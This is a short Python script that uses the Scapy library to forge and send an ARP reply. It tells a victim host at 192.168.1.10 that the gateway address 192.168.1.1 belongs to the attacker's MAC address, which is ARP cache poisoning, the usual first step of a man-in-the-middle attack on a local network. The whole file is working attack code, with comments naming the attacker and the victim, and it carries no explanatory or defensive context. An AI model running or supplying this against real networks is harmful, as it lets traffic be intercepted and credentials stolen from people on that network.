from scapy.all import ARP, Ether, send

target_ip = "192.168.1.10"       
target_mac = "00:11:22:33:44:55" 
spoof_ip = "192.168.1.1"         
my_mac = "de:ad:be:ef:00:01"     

eth = Ether(dst=target_mac)

arp = ARP(op=2,                # 2 = is-at (ARP reply)
          psrc=spoof_ip,       # Claimed source IP
          hwsrc=my_mac,        # Claimed source MAC (attacker's)
          pdst=target_ip,      # Target IP (victim)
          hwdst=target_mac)    # Target MAC (victim)

packet = eth / arp
send(packet, verbose=False)

print("ARP reply sent.")